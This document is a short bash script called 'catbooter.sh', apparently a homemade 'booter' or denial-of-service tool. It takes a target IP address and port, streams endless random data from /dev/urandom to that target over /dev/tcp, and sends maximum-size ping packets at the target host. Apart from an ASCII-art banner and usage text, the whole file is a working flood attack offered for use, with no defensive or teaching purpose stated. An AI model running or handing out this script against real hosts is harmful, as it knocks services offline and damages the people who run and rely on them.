#!/bin/bash

function connect {
cat /dev/urandom | cat > /dev/tcp/$host/$port &&  ping -s 65507 $host
}


while getopts i:p:-port:h option 
do 
case "${option}" in 
i) host=${OPTARG};; 
p) port=${OPTARG};; 
-port) port=${OPTARG};; 
h) echo "Usage: ./catbooter.sh -i <ip address> -p <port>";; 
 
?)
  echo "Usage: ./catbooter.sh -i <ip address> -p <port>" >&2
  exit 1
  ;;
  esac
 connect

done 


printf """
┌───────────────────────────────────────────────────────────────┐
│                                                               │
│   mmm           m    #        m      m      m                 │
│ m"   "  mmm   mm#mm  #mmm   "m#m"  "m#m"  mm#mm   mmm    m mm │
│ #      "   #    #    #" "#  m"#"m  m"#"m    #    #"  #   #"  "│
│ #      m"""#    #    #   #    "      "      #    #""""   #    │
│  "mmm" "mm"#    "mm  ##m#"                  "mm  "#mm"   #    │
│                                                               │
│                                                        v0.1.4 │
└───────────────────────────────────────────────────────────────┘

--by vit0byt3 [vit0byt3@gmail.com]

Usage: ./catbooter.sh -i <ip address> -p <port>
__________

-h : show this help module
-i : host 
-p [--port] : port


"""




